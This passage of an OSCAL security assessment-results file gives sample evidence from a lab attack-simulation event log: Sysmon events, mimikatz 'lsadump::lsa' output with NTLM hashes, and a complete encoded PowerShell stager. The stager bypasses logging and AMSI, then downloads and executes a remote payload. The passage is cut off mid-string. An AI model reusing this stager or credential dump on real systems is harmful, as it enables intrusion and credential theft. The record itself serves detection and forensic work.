{
  "assessment-results": {
    "uuid": "f6249193-0d1d-47d0-a2ae-bba988288aba",
    "metadata": {
      "title": "Aegis-Sentinel OSCAL Assessment Results",
      "last-modified": "2026-05-09T08:32:10.204546900-07:00",
      "version": "1.0",
      "oscal-version": "1.1.2"
    },
    "results": [
      {
        "uuid": "3aa4dc44-ba1a-48ea-af6d-ad691b3301d6",
        "title": "Forensic Assessment for Aegis-Sentinel",
        "description": "Aegis-automated audit record (LFA v3) containing 6605 signals (Aggregated).",
        "start": "2026-05-09T08:32:10.204530900-07:00",
        "observations": [
          {
            "uuid": "df432746-e24c-4f98-b710-ae95c673ddde",
            "description": "NIST Control Capture: AC-3 [Credential Access]",
            "methods": [
              "EXAMINE",
              "TEST"
            ],
            "occurrence-count": 10,
            "sample-evidence": [
              "{\"tags\":[\"mordorDataset\"],\"TargetProcessGUID\":\"{297bc33e-6758-5f2d-8a07-000000000400}\",\"@version\":\"1\",\"EventType\":\"INFO\",\"Version\":3,\"ThreadID\":4364,\"EventTime\":\"2020-08-07 10:39:12\",\"Task\":10,\"AccountType\":\"User\",\"SourceProcessGUID\":\"{297bc33e-5c31-5f2b-2b00-000000000400}\",\"CallTrace\":\"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+2726e|c:\\\\windows\\\\system32\\\\sysmain.dll+1e689|c:\\\\windows\\\\system32\\\\sysmain.dll+1e509|c:\\\\windows\\\\system32\\\\sysmain.dll+1c32b|c:\\\\windows\\\\system32\\\\sysmain.dll+1bf95|c:\\\\windows\\\\system32\\\\sysmain.dll+74b0d|c:\\\\windows\\\\system32\\\\sysmain.dll+73b32|c:\\\\windows\\\\system32\\\\sysmain.dll+601a3|C:\\\\windows\\\\system32\\\\svchost.exe+314c|C:\\\\windows\\\\System32\\\\sechost.dll+2de2|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+17bd4|C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+6ce51\",\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"OpcodeValue\":0,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:14.246Z\",\"Message\":\"Process accessed:\\r\\nRuleName: -\\r\\nUtcTime: 2020-08-07 14:39:12.968\\r\\nSourceProcessGUID: {297bc33e-5c31-5f2b-2b00-000000000400}\\r\\nSourceProcessId: 1784\\r\\nSourceThreadId: 1876\\r\\nSourceImage: C:\\\\windows\\\\system32\\\\svchost.exe\\r\\nTargetProcessGUID: {297bc33e-6758-5f2d-8a07-000000000400}\\r\\nTargetProcessId: 3064\\r\\nTargetImage: C:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe\\r\\nGrantedAccess: 0x3000\\r\\nCallTrace: C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+2726e|c:\\\\windows\\\\system32\\\\sysmain.dll+1e689|c:\\\\windows\\\\system32\\\\sysmain.dll+1e509|c:\\\\windows\\\\system32\\\\sysmain.dll+1c32b|c:\\\\windows\\\\system32\\\\sysmain.dll+1bf95|c:\\\\windows\\\\system32\\\\sysmain.dll+74b0d|c:\\\\windows\\\\system32\\\\sysmain.dll+73b32|c:\\\\windows\\\\system32\\\\sysmain.dll+601a3|C:\\\\windows\\\\system32\\\\svchost.exe+314c|C:\\\\windows\\\\System32\\\\sechost.dll+2de2|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+17bd4|C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+6ce51\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"1784\",\"SourceImage\":\"C:\\\\windows\\\\system32\\\\svchost.exe\",\"EventReceivedTime\":\"2020-08-07 10:39:14\",\"port\":60122,\"AccountName\":\"SYSTEM\",\"UtcTime\":\"2020-08-07 14:39:12.968\",\"GrantedAccess\":\"0x3000\",\"Domain\":\"NT AUTHORITY\",\"ExecutionProcessID\":3284,\"host\":\"wec.internal.cloudapp.net\",\"SourceProcessId\":\"1784\",\"SourceThreadId\":\"1876\",\"Severity\":\"INFO\",\"TargetProcessId\":\"3064\",\"SeverityValue\":2,\"EventID\":10,\"UserID\":\"S-1-5-18\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":727036,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":-9223372036854775808,\"TargetImage\":\"C:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe\",\"RuleName\":\"-\"}",
              "{\"tags\":[\"mordorDataset\"],\"TargetProcessGUID\":\"{297bc33e-6751-5f2d-8807-000000000400}\",\"@version\":\"1\",\"EventType\":\"INFO\",\"Version\":3,\"ThreadID\":4364,\"EventTime\":\"2020-08-07 10:39:12\",\"Task\":10,\"AccountType\":\"User\",\"SourceProcessGUID\":\"{297bc33e-5c31-5f2b-2b00-000000000400}\",\"CallTrace\":\"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+2726e|c:\\\\windows\\\\system32\\\\sysmain.dll+44b1f|c:\\\\windows\\\\system32\\\\sysmain.dll+1e899|c:\\\\windows\\\\system32\\\\sysmain.dll+1e7be|c:\\\\windows\\\\system32\\\\sysmain.dll+1e6a5|c:\\\\windows\\\\system32\\\\sysmain.dll+1e509|c:\\\\windows\\\\system32\\\\sysmain.dll+1c32b|c:\\\\windows\\\\system32\\\\sysmain.dll+1bf95|c:\\\\windows\\\\system32\\\\sysmain.dll+74b0d|c:\\\\windows\\\\system32\\\\sysmain.dll+73b32|c:\\\\windows\\\\system32\\\\sysmain.dll+601a3|C:\\\\windows\\\\system32\\\\svchost.exe+314c|C:\\\\windows\\\\System32\\\\sechost.dll+2de2|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+17bd4|C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+6ce51\",\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"OpcodeValue\":0,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:14.246Z\",\"Message\":\"Process accessed:\\r\\nRuleName: -\\r\\nUtcTime: 2020-08-07 14:39:12.968\\r\\nSourceProcessGUID: {297bc33e-5c31-5f2b-2b00-000000000400}\\r\\nSourceProcessId: 1784\\r\\nSourceThreadId: 1876\\r\\nSourceImage: C:\\\\windows\\\\system32\\\\svchost.exe\\r\\nTargetProcessGUID: {297bc33e-6751-5f2d-8807-000000000400}\\r\\nTargetProcessId: 7256\\r\\nTargetImage: C:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe\\r\\nGrantedAccess: 0x3000\\r\\nCallTrace: C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+2726e|c:\\\\windows\\\\system32\\\\sysmain.dll+44b1f|c:\\\\windows\\\\system32\\\\sysmain.dll+1e899|c:\\\\windows\\\\system32\\\\sysmain.dll+1e7be|c:\\\\windows\\\\system32\\\\sysmain.dll+1e6a5|c:\\\\windows\\\\system32\\\\sysmain.dll+1e509|c:\\\\windows\\\\system32\\\\sysmain.dll+1c32b|c:\\\\windows\\\\system32\\\\sysmain.dll+1bf95|c:\\\\windows\\\\system32\\\\sysmain.dll+74b0d|c:\\\\windows\\\\system32\\\\sysmain.dll+73b32|c:\\\\windows\\\\system32\\\\sysmain.dll+601a3|C:\\\\windows\\\\system32\\\\svchost.exe+314c|C:\\\\windows\\\\System32\\\\sechost.dll+2de2|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+17bd4|C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+6ce51\",\"SourceModuleName\":\"eventlog\",\"ProcessId\":\"1784\",\"SourceImage\":\"C:\\\\windows\\\\system32\\\\svchost.exe\",\"EventReceivedTime\":\"2020-08-07 10:39:14\",\"port\":60122,\"AccountName\":\"SYSTEM\",\"UtcTime\":\"2020-08-07 14:39:12.968\",\"GrantedAccess\":\"0x3000\",\"Domain\":\"NT AUTHORITY\",\"ExecutionProcessID\":3284,\"host\":\"wec.internal.cloudapp.net\",\"SourceProcessId\":\"1784\",\"SourceThreadId\":\"1876\",\"Severity\":\"INFO\",\"TargetProcessId\":\"7256\",\"SeverityValue\":2,\"EventID\":10,\"UserID\":\"S-1-5-18\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":727037,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":-9223372036854775808,\"TargetImage\":\"C:\\\\windows\\\\system32\\\\wbem\\\\wmiprvse.exe\",\"RuleName\":\"-\"}",
              "{\"@version\":\"1\",\"EventType\":\"INFO\",\"Version\":0,\"ThreadID\":4428,\"EventTime\":\"2020-08-07 10:39:39\",\"Task\":0,\"AccountType\":\"Well Known Group\",\"Channel\":\"Microsoft-Windows-WMI-Activity/Operational\",\"SourceName\":\"Microsoft-Windows-WMI-Activity\",\"OpcodeValue\":0,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:40.541Z\",\"Message\":\"CIMWin32 provider started with result code 0x0. HostProcess = wmiprvse.exe; ProcessID = 7256; ProviderPath = %systemroot%\\\\system32\\\\wbem\\\\cimwin32.dll\",\"Opcode\":\"Info\",\"SourceModuleName\":\"eventlog\",\"EventReceivedTime\":\"2020-08-07 10:39:40\",\"port\":60122,\"AccountName\":\"NETWORK SERVICE\",\"Domain\":\"NT AUTHORITY\",\"ExecutionProcessID\":7256,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"SeverityValue\":2,\"EventID\":5857,\"UserID\":\"S-1-5-20\",\"ProviderGuid\":\"{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}\",\"RecordNumber\":584,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":4611686018427387904,\"tags\":[\"mordorDataset\"]}",
              "{\"@version\":\"1\",\"EventType\":\"INFO\",\"AccountType\":\"User\",\"ThreadID\":4364,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"OpcodeValue\":0,\"OriginalFileName\":\"PERFOS.DLL\",\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:40.793Z\",\"ProcessId\":\"7256\",\"Signed\":\"true\",\"host\":\"wec.internal.cloudapp.net\",\"SignatureStatus\":\"Valid\",\"Severity\":\"INFO\",\"SeverityValue\":2,\"Image\":\"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\",\"SourceModuleType\":\"im_msvistalog\",\"FileVersion\":\"10.0.18362.1 (WinBuild.160101.0800)\",\"Version\":3,\"Company\":\"Microsoft Corporation\",\"EventTime\":\"2020-08-07 10:39:39\",\"Task\":7,\"Signature\":\"Microsoft Windows\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"Message\":\"Image loaded:\\r\\nRuleName: -\\r\\nUtcTime: 2020-08-07 14:39:39.499\\r\\nProcessGuid: {297bc33e-6751-5f2d-8807-000000000400}\\r\\nProcessId: 7256\\r\\nImage: C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\\r\\nImageLoaded: C:\\\\Windows\\\\System32\\\\perfos.dll\\r\\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\\r\\nDescription: Windows System Performance Objects DLL\\r\\nProduct: Microsoft® Windows® Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: PERFOS.DLL\\r\\nHashes: SHA1=33B6C648B24C541E852C7675E4B64F618CD297BF,MD5=E2A9F5806503917CAC695DA3086D5603,SHA256=B0FAE9E5A6D510C39543A1376ECE354A0594B01D83F8B4DE4F3927FDD8858132,IMPHASH=39D036639AC01863A82823DC493D7A27\\r\\nSigned: true\\r\\nSignature: Microsoft Windows\\r\\nSignatureStatus: Valid\",\"SourceModuleName\":\"eventlog\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\perfos.dll\",\"EventReceivedTime\":\"2020-08-07 10:39:40\",\"port\":60122,\"AccountName\":\"SYSTEM\",\"UtcTime\":\"2020-08-07 14:39:39.499\",\"Domain\":\"NT AUTHORITY\",\"ExecutionProcessID\":3284,\"Hashes\":\"SHA1=33B6C648B24C541E852C7675E4B64F618CD297BF,MD5=E2A9F5806503917CAC695DA3086D5603,SHA256=B0FAE9E5A6D510C39543A1376ECE354A0594B01D83F8B4DE4F3927FDD8858132,IMPHASH=39D036639AC01863A82823DC493D7A27\",\"Description\":\"Windows System Performance Objects DLL\",\"UserID\":\"S-1-5-18\",\"EventID\":7,\"Product\":\"Microsoft® Windows® Operating System\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":727102,\"Keywords\":-9223372036854775808,\"ProcessGuid\":\"{297bc33e-6751-5f2d-8807-000000000400}\",\"tags\":[\"mordorDataset\"],\"RuleName\":\"-\"}",
              "{\"@version\":\"1\",\"EventType\":\"INFO\",\"Version\":1,\"ThreadID\":6964,\"EventTime\":\"2020-08-07 10:39:50\",\"Task\":106,\"AccountType\":\"User\",\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"SourceName\":\"Microsoft-Windows-PowerShell\",\"OpcodeValue\":20,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:39:58.684Z\",\"Message\":\"CommandInvocation(Write-Output): \\\"Write-Output\\\"\\r\\nParameterBinding(Write-Output): name=\\\"InputObject\\\"; value=\\\"\\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\\n .## ^ ##.  \\\"A La Vie, A L'Amour\\\" - (oe.eo)\\n ## / \\\\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\\n ## \\\\ / ##       > http://blog.gentilkiwi.com/mimikatz\\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\\n\\nmimikatz(powershell) # lsadump::lsa /patch\\nDomain : WORKSTATION5 / S-1-5-21-1549354820-3669603161-4025758380\\n\\nRID  : 000001f7 (503)\\nUser : DefaultAccount\\nLM   : \\nNTLM : \\n\\nRID  : 000001f5 (501)\\nUser : Guest\\nLM   : \\nNTLM : \\n\\nRID  : 000001f4 (500)\\nUser : wardog\\nLM   : \\nNTLM : 42ddb2963bbe8f1c075fc869d3bce33e\\n\\nRID  : 000001f8 (504)\\nUser : WDAGUtilityAccount\\nLM   : \\nNTLM : 45a313f1860be24e967e55b94649aa31\\n, ...\\\"\\r\\n\\r\\n\\r\\nContext:\\r\\n        Severity = Informational\\r\\n        Host Name = Default Host\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = 18d2a904-7116-4dc5-8a92-4afeea74e2f1\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = fb249e3f-a85b-4722-b17c-49b652225701\\r\\n        Pipeline ID = 1\\r\\n        Command Name = Write-Output\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 21494\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\\r\\n\\r\\nUser Data:\\r\\n\\r\\n\",\"Category\":\"Executing Pipeline\",\"Opcode\":\"To be used when operation is just executing a method\",\"SourceModuleName\":\"eventlog\",\"EventReceivedTime\":\"2020-08-07 10:39:58\",\"port\":60122,\"AccountName\":\"pgustavo\",\"ContextInfo\":\"        Severity = Informational\\r\\n        Host Name = Default Host\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = 18d2a904-7116-4dc5-8a92-4afeea74e2f1\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJ